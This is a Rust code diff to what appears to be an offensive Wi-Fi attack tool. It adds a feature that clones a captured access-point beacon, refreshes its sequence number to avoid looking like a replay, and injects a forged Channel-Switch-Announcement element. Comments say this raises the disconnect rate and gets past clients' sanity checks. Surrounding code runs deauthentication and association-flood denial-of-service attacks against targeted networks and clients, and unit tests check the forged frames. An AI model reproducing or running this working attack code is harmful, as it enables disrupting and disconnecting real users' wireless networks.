@@ -27,6 +27,7 @@ struct TargetState {
     deauth_count: u64,
     scope: DeauthScope,
     client_filter: Vec<String>,
+    raw_beacon: Option<Vec<u8>>,
 }
 
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
@@ -41,6 +42,7 @@ impl TargetState {
             deauth_count: 0,
             scope: DeauthScope::Broadcast,
             client_filter: t.client_filter.clone(),
+            raw_beacon: t.raw_beacon.clone(),
         }
     }
 }
@@ -62,6 +64,12 @@ fn rebuild_target_states(old: &[TargetState], new_targets: &[Target]) -> Vec<Tar
                     .map(|s| s.scope.clone())
                     .unwrap_or(DeauthScope::Broadcast),
                 client_filter: t.client_filter.clone(),
+                // Prefer a freshly-captured beacon from the new target; keep the
+                // previously-cloned one if the update doesn't carry one.
+                raw_beacon: t
+                    .raw_beacon
+                    .clone()
+                    .or_else(|| prev.and_then(|s| s.raw_beacon.clone())),
             }
         })
         .collect()
@@ -165,6 +173,7 @@ pub fn start_attack(
                             let band = target_states[idx].band;
                             let bssid = target_states[idx].bssid.clone();
                             let ssid = target_states[idx].ssid.clone();
+                            let raw_beacon = target_states[idx].raw_beacon.clone();
                             let scope = target_states[idx].scope.clone();
                             let client_filter = target_states[idx].client_filter.clone();
 
@@ -189,7 +198,7 @@ pub fn start_attack(
                                     }
                                     AttackType::CsaBeacon => {
                                         let cur = if ch > 0 { ch } else { current_ch };
-                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur);
+                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur, raw_beacon.as_deref());
                                     }
                                     AttackType::Deauth => {
                                         if !client_filter.is_empty() {
@@ -285,6 +294,7 @@ pub fn start_attack(
 
                             let bssid = target_states[idx].bssid.clone();
                             let ssid = target_states[idx].ssid.clone();
+                            let raw_beacon = target_states[idx].raw_beacon.clone();
                             let scope = target_states[idx].scope.clone();
                             let client_filter = target_states[idx].client_filter.clone();
                             let ch = target_states[idx].channel;
@@ -295,7 +305,7 @@ pub fn start_attack(
                                     }
                                     AttackType::CsaBeacon => {
                                         let cur = if ch > 0 { ch } else { current_ch };
-                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur);
+                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur, raw_beacon.as_deref());
                                     }
                                     AttackType::Deauth => {
                                         if !client_filter.is_empty() {
@@ -570,6 +580,49 @@ pub(crate) fn build_csa_beacon_frame(bssid_str: &str, ssid: &str, cur_channel: u
     wrap_radiotap(&frame)
 }
 
+/// Clone a captured real beacon (`raw` = the 802.11 mgmt frame, radiotap and FCS
+/// already stripped) and inject a fresh Channel-Switch-Announcement element. The
+/// result is byte-faithful to the AP's real beacon apart from a refreshed
+/// sequence number and the appended CSA — far more likely to survive a client's
+/// CSA sanity-check than a synthesized beacon. Returns `None` if `raw` is too
+/// short to be a beacon (caller should fall back to synthesis).
+pub(crate) fn build_csa_from_beacon(raw: &[u8], cur_channel: u8) -> Option<Vec<u8>> {
+    // 24-byte MAC header + 12-byte fixed params (timestamp/interval/capability).
+    const IE_START: usize = 24 + 12;
+    if raw.len() < IE_START {
+        return None;
+    }
+    let mut frame = raw.to_vec();
+    // Refresh the sequence-control field (header bytes 22..24) so the spoofed
+    // beacon isn't an obvious replay of a stale sequence number.
+    frame[22..24].copy_from_slice(&next_seq().to_le_bytes());
+    // Drop any CSA element the real beacon already carried, then insert ours at
+    // the front of the IE list (clients accept CSA anywhere in the list).
+    strip_element(&mut frame, IE_START, 0x25);
+    let csa = [0x25u8, 0x03, 0x01, csa_target_channel(cur_channel), 0x01];
+    frame.splice(IE_START..IE_START, csa.iter().copied());
+    Some(wrap_radiotap(&frame))
+}
+
+/// Remove the first information element with `tag` from the IE list that starts
+/// at `ie_start`. No-op if not found or the list is malformed.
+fn strip_element(frame: &mut Vec<u8>, ie_start: usize, tag: u8) {
+    let mut pos = ie_start;
+    while pos + 2 <= frame.len() {
+        let t = frame[pos];
+        let len = frame[pos + 1] as usize;
+        let end = pos + 2 + len;
+        if end > frame.len() {
+            return; // malformed — leave as-is
+        }
+        if t == tag {
+            frame.drain(pos..end);
+            return;
+        }
+        pos = end;
+    }
+}
+
 /// Auth+assoc pair sharing one spoofed MAC — drives the AP through the full
 /// association handshake so each fake client consumes a real table slot.
 /// Returns (auth, assoc).
@@ -604,8 +657,19 @@ fn send_auth_dos_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str, ssid:
 }
 
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
-fn send_csa_beacon_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str, ssid: &str, cur_channel: u8) {
-    let _ = cap.sendpacket(build_csa_beacon_frame(bssid, ssid, cur_channel).as_slice());
+fn send_csa_beacon_frame(
+    cap: &mut pcap::Capture<pcap::Active>,
+    bssid: &str,
+    ssid: &str,
+    cur_channel: u8,
+    raw_beacon: Option<&[u8]>,
+) {
+    // Clone the real captured beacon when available (highest disconnect rate);
+    // otherwise fall back to a synthesized minimal beacon.
+    let frame = raw_beacon
+        .and_then(|raw| build_csa_from_beacon(raw, cur_channel))
+        .unwrap_or_else(|| build_csa_beacon_frame(bssid, ssid, cur_channel));
+    let _ = cap.sendpacket(frame.as_slice());
 }
 
 #[allow(dead_code)]
@@ -803,6 +867,37 @@ mod tests {
         assert_eq!(body[csa + 2], 0x01); // switch mode = stop TX
         assert_ne!(body[csa + 3], 6); // new channel ≠ current
         assert_eq!(body[csa + 4], 0x01); // switch count
+    }
+
+    #[test]
+    fn csa_clone_injects_csa_and_strips_old() {
+        // Minimal real beacon: 24B hdr + 12B fixed + SSID IE + a stale CSA IE.
+        let mut raw = vec![0u8; 24];
+        raw[0] = 0x80; // beacon FC
+        raw[16..22].copy_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]); // BSSID
+        raw.extend_from_slice(&[0u8; 8]); // timestamp
+        raw.extend_from_slice(&0x0064u16.to_le_bytes()); // interval
+        raw.extend_from_slice(&0x0431u16.to_le_bytes()); // capability
+        raw.extend_from_slice(&[0x00, 0x03, b'N', b'e', b't']); // SSID IE
+        raw.extend_from_slice(&[0x25, 0x03, 0x01, 0x09, 0x05]); // stale CSA (ch 9)
+
+        let p = build_csa_from_beacon(&raw, 6).expect("clone");
+        let body = &p[RT..];
+        // Our CSA sits at the front of the IE list (right after fixed params).
+        let ie_start = 24 + 12;
+        assert_eq!(&body[ie_start..ie_start + 2], &[0x25, 0x03]);
+        assert_ne!(body[ie_start + 3], 6); // points off current channel
+        assert_eq!(body[ie_start + 4], 0x01); // fresh switch count, not the stale 5
+        // Exactly one CSA element remains (stale one stripped).
+        let csa_count = body.windows(2).filter(|w| *w == [0x25u8, 0x03]).count();
+        assert_eq!(csa_count, 1);
+        // Original BSSID preserved (true clone).
+        assert_eq!(&body[16..22], &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
+    }
+
+    #[test]
+    fn csa_clone_rejects_short_frame() {
+        assert!(build_csa_from_beacon(&[0u8; 10], 6).is_none());
     }
 
     #[test]
